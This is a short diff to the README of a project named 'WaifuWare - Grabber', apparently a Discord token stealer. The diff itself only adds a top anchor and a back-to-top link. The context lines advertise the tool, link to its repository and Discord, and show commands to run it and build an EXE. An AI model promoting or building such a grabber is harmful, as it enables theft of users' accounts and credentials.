@@ -1,4 +1,4 @@
-# WaifuWare - Grabber
+## <a id="top"></a># WaifuWare - Grabber
 ## _Littleraly One Of The Best Grabber_
 
 ##### [Discord](https://discord.gg/8RXbqSFnnz) - [Build](https://github.com/NotFubukIl/DiscordTokenGrabber#Free%20Version%20Installation)
@@ -53,4 +53,4 @@ node clientFile.js
 build EXE: npm run build
 ```
 
-
+[Top](#top)
